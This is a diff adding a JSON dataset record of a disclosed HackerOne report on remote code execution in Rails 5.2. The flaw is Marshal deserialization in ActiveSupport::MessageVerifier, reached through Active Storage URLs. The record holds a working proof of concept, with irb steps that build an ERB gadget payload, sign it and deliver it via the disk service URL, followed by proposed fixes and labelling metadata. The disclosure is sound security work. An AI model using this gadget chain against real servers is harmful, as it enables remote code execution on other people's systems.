@@ -1,0 +1,53 @@
+{
+  "reported_to": "Ruby on Rails",
+  "reported_by": "ooooooo_q ",
+  "title": "RCE which may occur due to `ActiveSupport::MessageVerifier` or `ActiveSupport::MessageEncryptor` (especially Active storage)",
+  "content": "\nSince ActiveSupport::MessageVerifier and ActiveSupport::MessageEncryptor use Marshal as the default serializer, I confirmed that RCE is possible by object injection.\nCode 338 Bytes\n1# https://github.com/rails/rails/blob/v5.2.2/activesupport/lib/active_support/message_verifier.rb#L110\n2    def initialize(secret, options = {})\n3      raise ArgumentError, \"Secret should not be nil.\" unless secret\n4      @secret = secret\n5      @digest = options[:digest] || \"SHA1\"\n6      @serializer = options[:serializer] || Marshal\n7    end\nCode 500 Bytes\n1# https://github.com/rails/rails/blob/v5.2.2/activesupport/lib/active_support/message_encryptor.rb#L145\n2def initialize(secret, *signature_key_or_options)\n3  options = signature_key_or_options.extract_options!\n4  sign_secret = signature_key_or_options.first\n5  @secret = secret\n6  @sign_secret = sign_secret\n7  @cipher = options[:cipher] || self.class.default_cipher\n8  @digest = options[:digest] || \"SHA1\" unless aead_mode?\n9  @verifier = resolve_verifier\n10  @serializer = options[:serializer] || Marshal\n11end\nEspecially in Rails 5.2 and later, ActiveSupport::MessageVerifier is used to validate the URL used in Active Storage, and attacks are possible.\nCode 244 Bytes\n1# https://github.com/rails/rails/blob/v5.2.2/activestorage/lib/active_storage/engine.rb#L81\n2initializer \"active_storage.verifier\" do\n3  config.after_initialize do |app|\n4    ActiveStorage.verifier = app.message_verifier(\"ActiveStorage\")\n5  end\n6end\nCode 216 Bytes\n1# https://github.com/rails/rails/blob/v5.2.2/activestorage/app/controllers/active_storage/disk_controller.rb#L38\n2def decode_verified_key\n3  ActiveStorage.verifier.verified(params[:encoded_key], purpose: :blob_key)\n4end\nIt is also used in ActiveStorage::Blob.find_signed.\nAlso, these URLs can be accessed without using Active Storage.\nPoC\n#### 1. Prepare server\nCode 154 Bytes\n1$ ruby -v\n2ruby 2.6.0p0 (2018-12-25 revision 66547) [x86_64-darwin16]\n3\n4$ rails -v\n5Rails 5.2.2\n6\n7$ rails new verifier_rce\n8$ cd verifier_rce/\n9$ bundle install\nCode 925 Bytes\n1# Active Storage is not installed, but routes is usable\n2$ bin/rails routes\n3Prefix Verb URI Pattern                                                                              Controller#Action\n4rails_service_blob GET  /rails/active_storage/blobs/:signed_id/*filename(.:format)                               active_storage/blobs#show\n5rails_blob_representation GET  /rails/active_storage/representations/:signed_blob_id/:variation_key/*filename(.:format) active_storage/representations#show\n6rails_disk_service GET  /rails/active_storage/disk/:encoded_key/*filename(.:format)                              active_storage/disk#show\n7update_rails_disk_service PUT  /rails/active_storage/disk/:encoded_token(.:format)                                      active_storage/disk#update\n8rails_direct_uploads POST /rails/active_storage/direct_uploads(.:format)                                           active_storage/direct_uploads#create\n#### 2. Prepare payload\nCode 2.63 KiB\n1$ ls /tmp/rce\n2ls: /tmp/rce: No such file or directory\n3\n4$ bundle exec rails console\n5Running via Spring preloader in process 66998\n6Loading development environment (Rails 5.2.2)\n7\n8irb(main):001:0> # emulate verifier\n9=> nil\n10irb(main):002:0> app_class_name = VerifierRce::Application.name\n11=> \"VerifierRce::Application\"\n12irb(main):003:0> secret_key_base = Digest::MD5.hexdigest(VerifierRce::Application.name)\n13=> \"7e485df67863e85e584b3feecb22276d\"\n14irb(main):004:0> key_generator = ActiveSupport::CachingKeyGenerator.new(ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000))\n15=> #<ActiveSupport::CachingKeyGenerator:0x00007ff55ac60d48 @key_generator=#<ActiveSupport::KeyGenerator:0x00007ff55ac60d98 @secret=\"7e485df67863e85e584b3feecb22276d\", @iterations=1000>, @cache_keys=#<Concurrent::Map:0x00007ff55ac60cf8 entries=0 default_proc=nil>>\n16irb(main):005:0> secret = key_generator.generate_key(\"ActiveStorage\")\n17=> \"\\xB09\\x11u/6#\\x04\\xE6\\x15\\x9C_\\xBB\\xE8\\x94\\xD0pn<\\xFD\\x15\\x85\\x95\\x8BR\\x82\\x13\\xCA\\xC3\\xDE\\xAEB\\x98\\xDA\\v\\xD6+jI\\xE6\\x80\\x9E\\xC8$e\\xE8(\\xD5\\x98\\x82\\x1FVy1\\x9D>R\\xAE\\x9D\\xAE\\x88\\xF1\\xBA,\"\n18irb(main):006:0> verifier = ActiveSupport::MessageVerifier.new(secret)\n19=> #<ActiveSupport::MessageVerifier:0x00007ff558aaee20 @secret=\"\\xB09\\x11u/6#\\x04\\xE6\\x15\\x9C_\\xBB\\xE8\\x94\\xD0pn<\\xFD\\x15\\x85\\x95\\x8BR\\x82\\x13\\xCA\\xC3\\xDE\\xAEB\\x98\\xDA\\v\\xD6+jI\\xE6\\x80\\x9E\\xC8$e\\xE8(\\xD5\\x98\\x82\\x1FVy1\\x9D>R\\xAE\\x9D\\xAE\\x88\\xF1\\xBA,\", @digest=\"SHA1\", @serializer=Marshal, @options={}, @rotations=[]>\n20irb(main):007:0>\n21\n22\n23irb(main):008:0> # https://medium.com/@u0x/marshall-unserialization-exploit-for-ruby-on-rails-5-1-4-979475cfdba0\n24=> nil\n25irb(main):009:0> code = '`touch /tmp/rce`'\n26=> \"`touch /tmp/rce`\"\n27irb(main):010:0> erb = ERB.allocate\n28=> #<ERB:0x00007ff55acabdc0>\n29irb(main):011:0> erb.instance_variable_set :@src, code\n30=> \"`touch /tmp/rce`\"\n31irb(main):012:0> erb.instance_variable_set :@filename, \"1\"\n32=> \"1\"\n33irb(main):013:0> erb.instance_variable_set :@lineno, 1\n34=> 1\n35irb(main):014:0> dump_target  = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result\n36=> \"\"\n37irb(main):015:0>\n38\n39irb(main):016:0> verifier.generate(dump_target, purpose: :blob_key)\n40=> \"eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHZPa0JCWTNScGRtVlRkWEJ3YjNKME9qcEVaWEJ5WldOaGRHbHZiam82UkdWd2NtVmpZWFJsWkVsdWMzUmhibU5sVm1GeWFXRmliR1ZRY205NGVRazZEa0JwYm5OMFlXNWpaVzg2Q0VWU1FnZzZDVUJ6Y21OSkloVmdkRzkxWTJnZ0wzUnRjQzl5WTJWZ0Jqb0dSVlE2RGtCbWFXeGxibUZ0WlVraUJqRUdPd2xVT2d4QWJHbHVaVzV2YVFZNkRFQnRaWFJvYjJRNkMzSmxjM1ZzZERvSlFIWmhja2tpREVCeVpYTjFiSFFHT3dsVU9oQkFaR1Z3Y21WallYUnZja2wxT2g5QlkzUnBkbVZUZFhCd2IzSjBPanBFWlhCeVpXTmhkR2x2YmdBR093bFUiLCJleHAiOm51bGwsInB1ciI6ImJsb2Jfa2V5In19--78c21ddf5ca4239d862118730069e04fbf38fd3d\"\nCode 224 Bytes\n1# Confirm that the file was generated due to the side effect of creating payload\n2$ ls /tmp/rce\n3/tmp/rce\n4\n5# Erase the file as it disturbs the operation check\n6$ rm /tmp/rce\n7$ ls /tmp/rce\n8ls: /tmp/rce: No such file or directory\n#### 3. Attack\nStart server.\nCode 13 Bytes\n1$ bin/rails s\nOpen URL in browser.\n(GET /rails/active_storage/disk/:encoded_key/*filename, use payload for :encoded_key)\nCode 569 Bytes\n1http://0.0.0.0:3000/rails/active_storage/disk/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHZPa0JCWTNScGRtVlRkWEJ3YjNKME9qcEVaWEJ5WldOaGRHbHZiam82UkdWd2NtVmpZWFJsWkVsdWMzUmhibU5sVm1GeWFXRmliR1ZRY205NGVRazZEa0JwYm5OMFlXNWpaVzg2Q0VWU1FnZzZDVUJ6Y21OSkloVmdkRzkxWTJnZ0wzUnRjQzl5WTJWZ0Jqb0dSVlE2RGtCbWFXeGxibUZ0WlVraUJqRUdPd2xVT2d4QWJHbHVaVzV2YVFZNkRFQnRaWFJvYjJRNkMzSmxjM1ZzZERvSlFIWmhja2tpREVCeVpYTjFiSFFHT3dsVU9oQkFaR1Z3Y21WallYUnZja2wxT2g5QlkzUnBkbVZUZFhCd2IzSjBPanBFWlhCeVpXTmhkR2x2YmdBR093bFUiLCJleHAiOm51bGwsInB1ciI6ImJsb2Jfa2V5In19--78c21ddf5ca4239d862118730069e04fbf38fd3d/test\nConfirm that the file was created.\nCode 22 Bytes\n1$ ls /tmp/rce\n2/tmp/rce\nImpact\nIf the server is running in development mode with version 5.2 or later, if the attacker can know application name, secret_key_base can be obtained, so RCE can be easily done by accessing the URL.\nIn production mode, an attacker needs to know secret_key_base.\nFor versions less than 5.2, attacks are possible only if the user is able to input places using ActiveSupport::MessageVerifier or ActiveSupport::MessageEncryptor and the attacker knows secret_key_base.\nproposed measures\nUse JSON.load or Yaml.safe_load without using Marshal\nDisable access to URL if Active Storage is not used\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": 1500,
+  "weaknesses": [
+    "Command Injection - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1552520460,
+  "report_url": "https://hackerone.com/reports/473888",
+  "is_multi_component": false,
+  "complexity": "HIGH",
+  "novelty": "HIGH",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Set up a Rails 5.2.2 environment with ActiveStorage configured"
+    ],
+    [
+      2,
+      "Generate a malicious payload using ActiveSupport::MessageVerifier with Marshal serializer to execute arbitrary code"
+    ],
+    [
+      3,
+      "Access the ActiveStorage disk service URL with the generated payload as the encoded_key parameter"
+    ],
+    [
+      4,
+      "Observe the execution of the arbitrary command (e.g., file creation in /tmp)"
+    ]
+  ],
+  "vuln_description": "The vulnerability is a Remote Code Execution (RCE) flaw in Rails 5.2 and later, stemming from the use of Marshal as the default serializer in ActiveSupport::MessageVerifier and ActiveSupport::MessageEncryptor. This allows for object injection attacks, particularly exploitable through ActiveStorage URLs even when ActiveStorage is not explicitly used in the application.",
+  "reason": "This vulnerability requires understanding multiple Rails components (MessageVerifier, MessageEncryptor, ActiveStorage) and their interactions, knowledge of Ruby's Marshal serialization dangers, and the ability to craft a specific object injection payload. However, the attack path is relatively straightforward once these components are understood, and similar Marshal-based vulnerabilities have been seen before in Ruby applications.",
+  "new_complexity": "MEDIUM",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves deserialization of untrusted data through ActiveSupport::MessageVerifier/MessageEncryptor using Marshal as the default serializer, which can lead to RCE. The methodology described focuses on IDOR and AuthN/AuthZ bypasses through session/resource manipulation, but doesn't specifically address deserialization vulnerabilities or RCE through crafted payloads in URLs.",
+    "is_detectable": false
+  }
+}
